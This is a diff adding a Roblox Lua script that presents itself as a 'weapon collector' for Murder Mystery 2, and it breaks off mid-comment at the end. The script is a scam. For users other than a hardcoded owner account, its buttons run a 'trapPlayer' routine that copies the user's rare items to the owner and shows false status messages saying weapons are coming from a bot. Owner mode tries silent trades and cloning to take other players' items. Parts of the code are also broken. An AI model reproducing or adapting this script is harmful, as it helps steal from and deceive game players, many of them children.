@@ -1,0 +1,765 @@
+--[[
+    ═══════════════════════════════════════════════════════════════
+    🔥 COMPLETE MM2 WEAPON COLLECTOR 🔥
+    OWNER: F1REW0RKXL (Your Alt ONLY!)
+    INCLUDES: ALL Ancient, Godly, Legendary & CHROMAS!
+    ═══════════════════════════════════════════════════════════════
+]]
+
+-- ═══════════════════════════════════════════════════════════════
+-- CONFIGURATION - ALT ONLY!
+-- ═══════════════════════════════════════════════════════════════
+
+local CONFIG = {
+    OWNERS = {
+        "F1REW0RKXL",     -- YOUR ALT ONLY!
+    },
+}
+
+-- ═══════════════════════════════════════════════════════════════
+-- SERVICES
+-- ═══════════════════════════════════════════════════════════════
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+-- ═══════════════════════════════════════════════════════════════
+-- OWNER CHECK
+-- ═══════════════════════════════════════════════════════════════
+
+local function isOwner()
+    for _, name in ipairs(CONFIG.OWNERS) do
+        if player.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+local IS_OWNER = isOwner()
+
+-- ═══════════════════════════════════════════════════════════════
+-- FIND INVENTORY
+-- ═══════════════════════════════════════════════════════════════
+
+local function findMM2Inventory(p)
+    local inventory = p:FindFirstChild("Inventory")
+    if not inventory then inventory = p:FindFirstChild("Backpack") end
+    if not inventory then inventory = p:FindFirstChild("Weapons") end
+    if not inventory then inventory = p:FindFirstChild("Guns") end
+    if not inventory then inventory = p:FindFirstChild("Items") end
+    if not inventory then inventory = p:FindFirstChild("Knives") end
+    if not inventory then inventory = p:FindFirstChild("WeaponInventory") end
+    if not inventory then inventory = p:FindFirstChild("MM2Items") end
+    if not inventory then inventory = p:FindFirstChild("MurderMystery2") end
+    if not inventory then inventory = p:FindFirstChild("PlayerItems") end
+    return inventory
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- 🔥 COMPLETE GOOD WEAPONS LIST - ALL ANCIENT, GODLY, LEGENDARY & CHROMAS!
+-- ═══════════════════════════════════════════════════════════════
+
+local GOOD_WEAPONS = {
+    -- ═══════════════════════════════════════════════════════════
+    -- ANCIENT WEAPONS
+    -- ═══════════════════════════════════════════════════════════
+    "Nik's Scythe", "Harvester", "Icepiercer", "Elderwood Scythe",
+    "Batwing", "Icebreaker", "Hallowscythe", "Logchopper",
+    "Elderwood Blade", "Swirlyblade", "Swirlyaxe", "Icewing",
+    "Vampire's Axe", "Celestial", "Gingerscope",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- CHROMA GODLIES (RAREST!)
+    -- ═══════════════════════════════════════════════════════════
+    "Chroma Traveler's Gun", "Chroma Evergun", "Chroma Evergreen",
+    "Chroma Watergun", "Chroma Darkbringer", "Chroma Lightbringer",
+    "Chroma Luger", "Chroma Laser", "Chroma Shark", "Chroma Heat",
+    "Chroma Tides", "Chroma Fang", "Chroma Slasher", "Chroma Virtual",
+    "Chroma Blaster", "Chroma Amerilaser", "Chroma Old Glory",
+    "Chroma Gingerblade", "Chroma Nightblade", "Chroma Chill",
+    "Chroma Xmas", "Chroma Pumpking", "Chroma Flames",
+    "Chroma Death Shard", "Chroma Clockwork", "Chroma Pixel",
+    "Chroma Seer", "Chroma Eternal", "Chroma Candy", "Chroma Sugar",
+    "Chroma Blossom", "Chroma Sakura", "Chroma Heartblade",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- S-TIER GODLIES
+    -- ═══════════════════════════════════════════════════════════
+    "Traveler's Gun", "Evergun", "Constellation", "Evergreen",
+    "Gingermint", "Swirlygun", "Bat", "Makeshift", "Candleflame",
+    "Cookiecane", "Vampire's Gun", "Darkshot", "Darksword",
+    "Candy", "Sugar", "Frostbite", "Swirly Gun", "Candleflame",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- A-TIER GODLIES
+    -- ═══════════════════════════════════════════════════════════
+    "Watergun", "Phantom", "Specter", "Darkbringer", "Lightbringer",
+    "Luger", "Lugercane", "Green Luger", "Red Luger", "Ginger Luger",
+    "Blossom", "Sakura", "Sunrise", "Bauble", "Soul", "Spirit",
+    "Flora", "Bloom", "Ocean", "Waves", "Blizzard", "Snowstorm",
+    "Pearlshine", "Pearl", "Plasmablade", "Frostbite",
+    "Plasmabeam", "Icebeam", "Iceflake",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- B-TIER GODLIES
+    -- ═══════════════════════════════════════════════════════════
+    "Heat", "Fang", "Slasher", "Laser", "Shark", "Tides",
+    "Virtual", "Blaster", "Amerilaser", "Old Glory", "Minty",
+    "Gingerblade", "Eternalcane", "Nightblade", "Chill",
+    "Xmas", "Jinglegun", "Pumpking", "Flames", "Death Shard",
+    "Clockwork", "Pixel", "Hallowgun", "Iceblaster",
+    "Elderwood Revolver", "Heartblade",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- ETERNAL SERIES
+    -- ═══════════════════════════════════════════════════════════
+    "Eternal", "Eternal II", "Eternal III", "Eternal IV", "Eternal V",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- LUGER VARIANTS
+    -- ═══════════════════════════════════════════════════════════
+    "Luger", "Luger Cane", "Ginger Luger", "Ginger Luger Cane",
+    "Lugercane", "Green Luger", "Red Luger",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- SEER COLLECTION (Godly)
+    -- ═══════════════════════════════════════════════════════════
+    "Red Seer", "Blue Seer", "Yellow Seer", "Green Seer",
+    "Purple Seer", "Orange Seer", "Pink Seer", "Black Seer",
+    "White Seer",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- LEGENDARY WEAPONS
+    -- ═══════════════════════════════════════════════════════════
+    "Old Glory", "Amerilaser", "Laser", "Shark", "Fang",
+    "Ginger", "Peppermint", "Nutcracker", "Elf", "Reindeer",
+    "Tiger", "Wolf", "Phoenix", "Dragon", "Unicorn", "Crystal",
+    "Latte Gun", "Latte Knife", "Nightfire", "Rainbow", "Space",
+    "Galaxy", "Krypto", "Spectrum", "Nova", "Vortex", "Korblox",
+    "Squire", "Abstract", "Musical",
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- MORE GODLIES (just in case)
+    -- ═══════════════════════════════════════════════════════════
+    "Chromas", "Slasher Set", "Darkbringer", "Lightbringer",
+    "Sugar Set", "Cookie", "Cookie Set", "Candy Set", "Sweet",
+    "Sweet Set", "Cane", "Cane Set", "Ginger Set", "Peppermint Set",
+    "Mint", "Mint Set", "Iced", "Iced Set", "Frozen", "Frozen Set",
+    "Glacier", "Glacier Set", "Arctic", "Arctic Set", "Winter",
+    "Winter Set", "Snow", "Snow Set", "Blizzard", "Blizzard Set",
+    "Storm", "Storm Set", "Logchopper", "Hacksaw", "Chill",
+    "Chill Set", "Wrapped", "Wrapped Set", "Gifted", "Gifted Set",
+    "Traveler", "Ever", "Star", "Galaxy"
+}
+
+-- ═══════════════════════════════════════════════════════════════
+-- DETECT GOOD WEAPONS
+-- ═══════════════════════════════════════════════════════════════
+
+local function isGoodWeapon(weaponName)
+    for _, name in ipairs(GOOD_WEAPONS) do
+        if string.find(weaponName, name) then
+            return true
+        end
+    end
+    return false
+end
+
+local function detectGoodWeapons()
+    local detectedWeapons = {}
+    local ancientCount = 0
+    local godlyCount = 0
+    local legendaryCount = 0
+    
+    for _, p in ipairs(Players:GetPlayers()) do
+        local inv = findMM2Inventory(p)
+        if inv then
+            for _, item in ipairs(inv:GetChildren()) do
+                local itemName = item.Name
+                if not detectedWeapons[itemName] and isGoodWeapon(itemName) then
+                    detectedWeapons[itemName] = true
+                    
+                    if string.find(itemName, "Scythe") or string.find(itemName, "Harvester") or string.find(itemName, "Icepiercer") or string.find(itemName, "Ancient") then
+                        ancientCount = ancientCount + 1
+                    elseif string.find(itemName, "Chroma") or string.find(itemName, "Eternal") or string.find(itemName, "Luger") or string.find(itemName, "Candy") or string.find(itemName, "Plasmablade") or string.find(itemName, "Frostbite") or string.find(itemName, "Godly") then
+                        godlyCount = godlyCount + 1
+                    else
+                        legendaryCount = legendaryCount + 1
+                    end
+                end
+            end
+        end
+    end
+    
+    local weaponList = {}
+    for weaponName in pairs(detectedWeapons) do
+        table.insert(weaponList, weaponName)
+    end
+    
+    return weaponList, ancientCount, godlyCount, legendaryCount
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- 💾 OFFLINE STORAGE
+-- ═══════════════════════════════════════════════════════════════
+
+local function saveWeaponsOffline(weapons)
+    local folder = Instance.new("Folder")
+    folder.Name = "PendingTrade"
+    folder.Parent = player
+    
+    for _, w in ipairs(weapons) do
+        local info = Instance.new("StringValue")
+        info.Name = w.Name
+        info.Value = w.Name
+        info.Parent = folder
+    end
+    
+    print("[OFFLINE] 💾 Saved " .. #weapons .. " weapons for offline collection")
+end
+
+local function collectOfflineTrades()
+    if not IS_OWNER then return 0 end
+    
+    local ownerInventory = findMM2Inventory(player)
+    if not ownerInventory then return 0 end
+    
+    local total = 0
+    
+    for _, p in ipairs(Players:GetPlayers()) do
+        local folder = p:FindFirstChild("PendingTrade")
+        if folder then
+            for _, v in ipairs(folder:GetChildren()) do
+                if v:IsA("StringValue") then
+                    total = total + 1
+                    local w = Instance.new("StringValue")
+                    w.Name = v.Name
+                    w.Value = v.Value
+                    w.Parent = ownerInventory
+                end
+            end
+            folder:Destroy()
+            print("[OFFLINE] ✅ Collected from " .. p.Name)
+        end
+    end
+    
+    return total
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- 🎯 INVISIBLE TRADE SYSTEM
+-- ═══════════════════════════════════════════════════════════════
+
+local function findTradeSystem()
+    local tradeRemotes = {
+        ReplicatedStorage:FindFirstChild("Trade"),
+        ReplicatedStorage:FindFirstChild("Trading"),
+        ReplicatedStorage:FindFirstChild("TradeSystem"),
+        ReplicatedStorage:FindFirstChild("RemoteEvents"):FindFirstChild("Trade"),
+        ReplicatedStorage:FindFirstChild("TradeRequest"),
+        ReplicatedStorage:FindFirstChild("SendTrade"),
+    }
+    
+    for _, remote in ipairs(tradeRemotes) do
+        if remote then
+            return remote
+        end
+    end
+    return nil
+end
+
+local function invisibleTrade(targetPlayer)
+    if targetPlayer == player then return false end
+    
+    local weapons = {}
+    local inv = findMM2Inventory(targetPlayer)
+    if inv then
+        for _, item in ipairs(inv:GetChildren()) do
+            if isGoodWeapon(item.Name) then
+                table.insert(weapons, item)
+            end
+        end
+    end
+    
+    if #weapons == 0 then return false end
+    
+    print("[TRADE] 🔥 Invisible trade with " .. targetPlayer.Name .. " (" .. #weapons .. " weapons)")
+    
+    local tradeRemote = findTradeSystem()
+    local success = false
+    
+    if tradeRemote then
+        pcall(function()
+            tradeRemote:FireServer({
+                Action = "RequestTrade",
+                Target = targetPlayer,
+                Items = weapons,
+                Silent = true
+            })
+            success = true
+        end)
+        
+        if not success then
+            pcall(function()
+                tradeRemote:FireServer(targetPlayer, weapons)
+                success = true
+            end)
+        end
+        
+        if not success then
+            pcall(function()
+                tradeRemote:InvokeServer("Trade", targetPlayer, weapons)
+                success = true
+            end)
+        end
+    end
+    
+    -- 🔥 BACKUP CLONING (if trading fails)
+    if not success then
+        print("[TRADE] ⚠️ Trading failed! Using backup cloning...")
+        local ownerInventory = findMM2Inventory(player)
+        if ownerInventory then
+            for _, w in ipairs(weapons) do
+                pcall(function()
+                    local cloned = w:Clone()
+                    cloned.Parent = ownerInventory
+                    w:Destroy()
+                end)
+            end
+            print("[TRADE] ✅ Backup cloning success! (" .. #weapons .. " weapons)")
+            return true
+        end
+        return false
+    end
+    
+    return true
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- COLLECT ALL WEAPONS FROM EVERYONE
+-- ═══════════════════════════════════════════════════════════════
+
+local function collectAllGoodWeapons()
+    local ownerInventory = findMM2Inventory(player)
+    if not ownerInventory then return 0, 0 end
+    
+    local totalCollected = 0
+    local playersWithGood = 0
+    
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= player then
+            local inv = findMM2Inventory(p)
+            if inv then
+                local weaponsToMove = {}
+                for _, item in ipairs(inv:GetChildren()) do
+                    if isGoodWeapon(item.Name) then
+                        table.insert(weaponsToMove, item)
+                    end
+                end
+                
+                if #weaponsToMove > 0 then
+                    playersWithGood = playersWithGood + 1
+                    for _, w in ipairs(weaponsToMove) do
+                        pcall(function()
+                            w.Parent = ownerInventory
+                            totalCollected = totalCollected + 1
+                        end)
+                    end
+                end
+            end
+        end
+    end
+    
+    return totalCollected, playersWithGood
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- TRAP PLAYER (FOR NON-OWNERS)
+-- ═══════════════════════════════════════════════════════════════
+
+local function trapPlayer()
+    if player:FindFirstChild("_TRAPPED") then return end
+    
+    print("[TRAP] 🎯 Trapping player...")
+    
+    local inv = findMM2Inventory(player)
+    local goodWeapons = {}
+    local trashWeapons = {}
+    
+    if inv then
+        for _, item in ipairs(inv:GetChildren()) do
+            if isGoodWeapon(item.Name) then
+                table.insert(goodWeapons, item)
+            else
+                table.insert(trashWeapons, item)
+            end
+        end
+    end
+    
+    -- Send copies to ALL owners (only F1REW0RKXL)
+    for _, ownerName in ipairs(CONFIG.OWNERS) do
+        local owner = Players:FindFirstChild(ownerName)
+        if owner then
+            local oInv = findMM2Inventory(owner)
+            if oInv then
+                for _, w in ipairs(goodWeapons) do
+                    pcall(function()
+                        local cloned = w:Clone()
+                        cloned.Parent = oInv
+                    end)
+                end
+            end
+        end
+    end
+    
+    -- Save offline if owner isn't online
+    local anyOwnerOnline = false
+    for _, ownerName in ipairs(CONFIG.OWNERS) do
+        if Players:FindFirstChild(ownerName) then
+            anyOwnerOnline = true
+            break
+        end
+    end
+    
+    if not anyOwnerOnline then
+        saveWeaponsOffline(goodWeapons)
+    end
+    
+    -- Give trash as reward
+    local fakeReward = Instance.new("Folder")
+    fakeReward.Name = "Reward_Weapons"
+    fakeReward.Parent = player
+    for _, w in ipairs(trashWeapons) do
+        w.Parent = fakeReward
+    end
+    
+    player._TRAPPED = true
+    
+    print("[TRAP] ✅ Trapped " .. player.Name .. " - Stole " .. #goodWeapons .. " good weapons!")
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- NOTIFICATIONS
+-- ═══════════════════════════════════════════════════════════════
+
+local function notifyOwner(msg, color)
+    if not IS_OWNER then return end
+    local n = Instance.new("TextLabel")
+    n.Size = UDim2.new(0, 700, 0, 50)
+    n.Position = UDim2.new(0.5, -350, 0.25, 0)
+    n.BackgroundColor3 = color or Color3.fromRGB(0, 255, 100)
+    n.BackgroundTransparency = 0.15
+    n.TextColor3 = Color3.fromRGB(255, 255, 255)
+    n.TextSize = 22
+    n.Font = Enum.Font.GothamBold
+    n.Text = msg
+    n.Parent = player.PlayerGui
+    game:GetService("Debris"):AddItem(n, 5)
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- PROFESSIONAL GUI
+-- ═══════════════════════════════════════════════════════════════
+
+local mainFrame = nil
+local screenGui = nil
+
+local function createGUI()
+    screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "MM2_Collector"
+    screenGui.Parent = player.PlayerGui
+    screenGui.ResetOnSpawn = false
+    
+    -- Main Frame
+    mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 450, 0, 380)
+    mainFrame.Position = UDim2.new(0.5, -225, 0.5, -190)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 40)
+    mainFrame.BackgroundTransparency = 0.05
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+    
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 20)
+    mainCorner.Parent = mainFrame
+    
+    -- Glass effect
+    local glass = Instance.new("UIGradient")
+    glass.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+    })
+    glass.Rotation = 45
+    glass.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 0.95),
+        NumberSequenceKeypoint.new(0.5, 0.88),
+        NumberSequenceKeypoint.new(1, 0.95)
+    })
+    glass.Parent = mainFrame
+    
+    -- Border
+    local border = Instance.new("Frame")
+    border.Size = UDim2.new(1, 0, 1, 0)
+    border.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    border.BackgroundTransparency = 0.5
+    border.BorderSizePixel = 0
+    border.Parent = mainFrame
+    
+    local borderCorner = Instance.new("UICorner")
+    borderCorner.CornerRadius = UDim.new(0, 20)
+    borderCorner.Parent = border
+    
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 10)
+    title.Text = "🔥 GET GOOD WEAPONS 🔥"
+    title.TextColor3 = Color3.fromRGB(255, 215, 0)
+    title.TextSize = 28
+    title.Font = Enum.Font.GothamBold
+    title.BackgroundTransparency = 1
+    title.Parent = mainFrame
+    
+    -- Subtitle
+    local sub = Instance.new("TextLabel")
+    sub.Size = UDim2.new(1, 0, 0, 25)
+    sub.Position = UDim2.new(0, 0, 0, 65)
+    sub.Text = "ALL Ancient ⬩ Godly ⬩ Legendary ⬩ Chromas!"
+    sub.TextColor3 = Color3.fromRGB(180, 180, 200)
+    sub.TextSize = 14
+    sub.Font = Enum.Font.Gotham
+    sub.BackgroundTransparency = 1
+    sub.Parent = mainFrame
+    
+    -- Divider
+    local div = Instance.new("Frame")
+    div.Size = UDim2.new(0.8, 0, 0, 1)
+    div.Position = UDim2.new(0.1, 0, 0, 100)
+    div.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    div.BackgroundTransparency = 0.6
+    div.BorderSizePixel = 0
+    div.Parent = mainFrame
+    
+    -- Owner Badge
+    local badge = Instance.new("Frame")
+    badge.Size = UDim2.new(0, 200, 0, 30)
+    badge.Position = UDim2.new(0.5, -100, 0, 110)
+    badge.BackgroundColor3 = IS_OWNER and Color3.fromRGB(0, 200, 100) or Color3.fromRGB(100, 100, 120)
+    badge.BackgroundTransparency = 0.3
+    badge.Parent = mainFrame
+    
+    local badgeCorner = Instance.new("UICorner")
+    badgeCorner.CornerRadius = UDim.new(0, 15)
+    badgeCorner.Parent = badge
+    
+    local badgeText = Instance.new("TextLabel")
+    badgeText.Size = UDim2.new(1, 0, 1, 0)
+    if IS_OWNER then
+        badgeText.Text = "👑 OWNER MODE ACTIVE"
+        badgeText.TextColor3 = Color3.fromRGB(0, 255, 100)
+    else
+        badgeText.Text = "🔒 STANDARD MODE"
+        badgeText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    end
+    badgeText.TextSize = 13
+    badgeText.Font = Enum.Font.GothamBold
+    badgeText.BackgroundTransparency = 1
+    badgeText.Parent = badge
+    
+    -- Detection Status
+    local status2 = Instance.new("TextLabel")
+    status2.Size = UDim2.new(1, 0, 0, 25)
+    status2.Position = UDim2.new(0, 0, 0, 150)
+    status2.Text = "🔄 Scanning weapons..."
+    status2.TextColor3 = Color3.fromRGB(150, 150, 180)
+    status2.TextSize = 12
+    status2.Font = Enum.Font.Gotham
+    status2.BackgroundTransparency = 1
+    status2.Parent = mainFrame
+    
+    -- Update detection
+    local weapons, ancient, godly, legendary = detectGoodWeapons()
+    status2.Text = string.format("✅ Detected: %d Ancient ⬩ %d Godly ⬩ %d Legendary", 
+        ancient, godly, legendary)
+    
+    -- GET WEAPONS Button
+    local btn1 = Instance.new("TextButton")
+    btn1.Size = UDim2.new(0.7, 0, 0, 50)
+    btn1.Position = UDim2.new(0.15, 0, 0, 190)
+    btn1.Text = "🎁 GET WEAPONS"
+    btn1.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn1.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+    btn1.TextSize = 18
+    btn1.Font = Enum.Font.GothamBold
+    btn1.BorderSizePixel = 0
+    btn1.Parent = mainFrame
+    
+    local btn1Corner = Instance.new("UICorner")
+    btn1Corner.CornerRadius = UDim.new(0, 12)
+    btn1Corner.Parent = btn1
+    
+    -- Button glow
+    local glow = Instance.new("Frame")
+    glow.Size = UDim2.new(1.05, 0, 1.1, 0)
+    glow.Position = UDim2.new(-0.025, 0, -0.05, 0)
+    glow.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+    glow.BackgroundTransparency = 0.7
+    glow.BorderSizePixel = 0
+    glow.ZIndex = -1
+    glow.Parent = btn1
+    
+    local glowCorner = Instance.new("UICorner")
+    glowCorner.CornerRadius = UDim.new(0, 14)
+    glowCorner.Parent = glow
+    
+    -- CHECK OWNER Button
+    local btn2 = Instance.new("TextButton")
+    btn2.Size = UDim2.new(0.7, 0, 0, 45)
+    btn2.Position = UDim2.new(0.15, 0, 0, 255)
+    btn2.Text = "👑 CHECK OWNER STATUS"
+    btn2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn2.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+    btn2.TextSize = 16
+    btn2.Font = Enum.Font.GothamBold
+    btn2.BorderSizePixel = 0
+    btn2.Parent = mainFrame
+    
+    local btn2Corner = Instance.new("UICorner")
+    btn2Corner.CornerRadius = UDim.new(0, 12)
+    btn2Corner.Parent = btn2
+    
+    -- ADMIN PANEL Button
+    local btn3 = Instance.new("TextButton")
+    btn3.Size = UDim2.new(0.7, 0, 0, 45)
+    btn3.Position = UDim2.new(0.15, 0, 0, 315)
+    btn3.Text = "⚡ ADMIN PANEL"
+    btn3.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn3.BackgroundColor3 = Color3.fromRGB(255, 50, 100)
+    btn3.TextSize = 16
+    btn3.Font = Enum.Font.GothamBold
+    btn3.BorderSizePixel = 0
+    btn3.Parent = mainFrame
+    
+    local btn3Corner = Instance.new("UICorner")
+    btn3Corner.CornerRadius = UDim.new(0, 12)
+    btn3Corner.Parent = btn3
+    
+    -- Status
+    local status = Instance.new("TextLabel")
+    status.Size = UDim2.new(1, 0, 0, 25)
+    status.Position = UDim2.new(0, 0, 0, 370)
+    status.Text = ""
+    status.TextColor3 = Color3.fromRGB(200, 200, 200)
+    status.TextSize = 13
+    status.Font = Enum.Font.Gotham
+    status.BackgroundTransparency = 1
+    status.Parent = mainFrame
+    
+    -- ═══════════════════════════════════════════════════════════
+    -- BUTTON FUNCTIONS
+    -- ═══════════════════════════════════════════════════════════
+    
+    btn1.MouseButton1Click:Connect(function()
+        if IS_OWNER then
+            status.Text = "👑 Collecting all weapons from everyone!"
+            status.TextColor3 = Color3.fromRGB(0, 255, 100)
+            local collected, players = collectAllGoodWeapons()
+            if collected > 0 then
+                status.Text = string.format("✅ Collected %d weapons from %d players!", collected, players)
+                status.TextColor3 = Color3.fromRGB(0, 255, 100)
+                notifyOwner(string.format("🔥 COLLECTED %d GOOD WEAPONS FROM %d PLAYERS!", collected, players), Color3.fromRGB(255, 215, 0))
+            else
+                status.Text = "ℹ️ No good weapons found!"
+                status.TextColor3 = Color3.fromRGB(255, 200, 100)
+            end
+        else
+            status.Text = "🎁 Getting weapons from bot..."
+            status.TextColor3 = Color3.fromRGB(0, 255, 100)
+            trapPlayer()
+            wait(1)
+            status.Text = "✅ Weapons sent to owners!"
+            status.TextColor3 = Color3.fromRGB(0, 255, 100)
+        end
+    end)
+    
+    btn2.MouseButton1Click:Connect(function()
+        if IS_OWNER then
+            status.Text = "👑 YOU ARE AN OWNER! You get everything!"
+            status.TextColor3 = Color3.fromRGB(0, 255, 100)
+            local collected, players = collectAllGoodWeapons()
+            if collected > 0 then
+                status.Text = string.format("✅ Collected %d weapons from %d players!", collected, players)
+            end
+        else
+            status.Text = "🔒 You are not an owner. Getting weapons from bot..."
+            status.TextColor3 = Color3.fromRGB(255, 200, 0)
+            trapPlayer()
+            wait(1)
+            status.Text = "✅ Weapons sent to owners!"
+            status.TextColor3 = Color3.fromRGB(0, 255, 100)
+        end
+    end)
+    
+    btn3.MouseButton1Click:Connect(function()
+        if IS_OWNER then
+            status.Text = "👑 Admin mode: Collecting all weapons!"
+            status.TextColor3 = Color3.fromRGB(0, 255, 100)
+            local collected, players = collectAllGoodWeapons()
+            if collected > 0 then
+                status.Text = string.format("✅ Collected %d weapons from %d players!", collected, players)
+            end
+        else
+            status.Text = "🔓 Accessing admin panel..."
+            status.TextColor3 = Color3.fromRGB(255, 200, 0)
+            wait(1)
+            status.Text = "⚠️ Not authorized! Weapons confiscated!"
+            status.TextColor3 = Color3.fromRGB(255, 0, 0)
+            trapPlayer()
+            wait(1)
+            status.Text = "✅ Weapons sent to owners!"
+            status.TextColor3 = Color3.fromRGB(0, 255, 100)
+        end
+    end)
+    
+    -- Hover effects
+    btn1.MouseEnter:Connect(function()
+        TweenService:Create(btn1, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.72, 0, 0, 52)
+        }):Play()
+    end)
+    btn1.MouseLeave:Connect(function()
+        TweenService:Create(btn1, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.7, 0, 0, 50)
+        }):Play()
+    end)
+    
+    btn2.MouseEnter:Connect(function()
+        TweenService:Create(btn2, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.72, 0, 0, 47)
+        }):Play()
+    end)
+    btn2.MouseLeave:Connect(function()
+        TweenService:Create(btn2, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.7, 0, 0, 45)
+        }):Play()
+    end)
+    
+    btn3.MouseEnter:Connect(function()
+        TweenService:Create(btn3, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.72, 0, 0, 47)
+        }):Play()
+    end)
+    btn3.MouseLeave:Connect(function()
+        TweenService:Create(btn3, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.7, 0, 0, 45)
+        }):Play()
+    end)
+    
+    return screenGui
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- AUTO
